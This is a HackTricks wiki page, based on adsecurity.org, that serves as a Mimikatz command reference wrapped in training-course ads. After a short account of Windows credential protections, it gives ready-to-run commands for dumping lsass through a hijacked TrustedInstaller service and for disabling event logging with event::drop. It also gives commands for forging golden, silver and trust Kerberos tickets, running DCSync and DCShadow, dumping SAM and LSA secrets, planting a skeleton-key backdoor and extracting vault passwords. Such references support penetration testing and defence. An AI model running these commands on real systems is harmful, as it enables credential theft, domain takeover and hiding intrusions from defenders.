# Mimikatz

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}


**This page is based on one from [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Check the original for further info!

## LM and Clear-Text in memory

From Windows 8.1 and Windows Server 2012 R2 onwards, significant measures have been implemented to safeguard against credential theft:

- **LM hashes and plain-text passwords** are no longer stored in memory to enhance security. A specific registry setting, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ must be configured with a DWORD value of `0` to disable Digest Authentication, ensuring "clear-text" passwords are not cached in LSASS.

- **LSA Protection** is introduced to shield the Local Security Authority (LSA) process from unauthorized memory reading and code injection. This is achieved by marking the LSASS as a protected process. Activation of LSA Protection involves:
    1. Modifying the registry at _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ by setting `RunAsPPL` to `dword:00000001`.
    2. Implementing a Group Policy Object (GPO) that enforces this registry change across managed devices.

Despite these protections, tools like Mimikatz can circumvent LSA Protection using specific drivers, although such actions are likely to be recorded in event logs.

### Counteracting SeDebugPrivilege Removal

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

This allows the dumping of the `lsass.exe` memory to a file, which can then be analyzed on another system to extract credentials:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz Options

Event log tampering in Mimikatz involves two primary actions: clearing event logs and patching the Event service to prevent logging of new events. Below are the commands for performing these actions:

#### Clearing Event Logs

- **Command**: This action is aimed at deleting the event logs, making it harder to track malicious activities.
- Mimikatz does not provide a direct command in its standard documentation for clearing event logs directly via its command line. However, event log manipulation typically involves using system tools or scripts outside of Mimikatz to clear specific logs (e.g., using PowerShell or Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- This experimental command is designed to modify the Event Logging Service's behavior, effectively preventing it from recording new events.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- The `privilege::debug` command ensures that Mimikatz operates with the necessary privileges to modify system services.
- The `event::drop` command then patches the Event Logging service.


### Kerberos Ticket Attacks

### Golden Ticket Creation

A Golden Ticket allows for domain-wide access impersonation. Key command and parameters:

- Command: `kerberos::golden`
- Parameters:
  - `/domain`: The domain name.
  - `/sid`: The domain's Security Identifier (SID).
  - `/user`: The username to impersonate.
  - `/krbtgt`: The NTLM hash of the domain's KDC service account.
  - `/ptt`: Directly injects the ticket into memory.
  - `/ticket`: Saves the ticket for later use.

Example:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Tickets grant access to specific services. Key command and parameters:

- Command: Similar to Golden Ticket but targets specific services.
- Parameters:
  - `/service`: The service to target (e.g., cifs, http).
  - Other parameters similar to Golden Ticket.

Example:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Creation

Trust Tickets are used for accessing resources across domains by leveraging trust relationships. Key command and parameters:

- Command: Similar to Golden Ticket but for trust relationships.
- Parameters:
  - `/target`: The target domain's FQDN.
  - `/rc4`: The NTLM hash for the trust account.

Example:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Additional Kerberos Commands

- **Listing Tickets**:
  - Command: `kerberos::list`
  - Lists all Kerberos tickets for the current user session.

- **Pass the Cache**:
  - Command: `kerberos::ptc`
  - Injects Kerberos tickets from cache files.
  - Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:
  - Command: `kerberos::ptt`
  - Allows using a Kerberos ticket in another session.
  - Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
  - Command: `kerberos::purge`
  - Clears all Kerberos tickets from the session.
  - Useful before using ticket manipulation commands to avoid conflicts.


### Active Directory Tampering

- **DCShadow**: Temporarily make a machine act as a DC for AD object manipulation.
  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Mimic a DC to request password data.
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extract credentials from LSA.
  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Impersonate a DC using a computer account's password data.
  - *No specific command provided for NetSync in original context.*

- **LSADUMP::SAM**: Access local SAM database.
  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decrypt secrets stored in the registry.
  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Set a new NTLM hash for a user.
  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Retrieve trust authentication information.
  - `mimikatz "lsadump::trust" exit`

### Miscellaneous

- **MISC::Skeleton**: Inject a backdoor into LSASS on a DC.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Acquire backup rights.
  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtain debug privileges.
  - `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Show credentials for logged-on users.
  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extract Kerberos tickets from memory.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Change SID and SIDHistory.
  - Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Modify: *No specific command for modify in original context.*

- **TOKEN::Elevate**: Impersonate tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Allow multiple RDP sessions.
  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: List TS/RDP sessions.
  - *No specific command provided for TS::Sessions in original context.*

### Vault

- Extract passwords from Windows Vault.
  - `mimikatz "vault::cred /patch" exit`


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
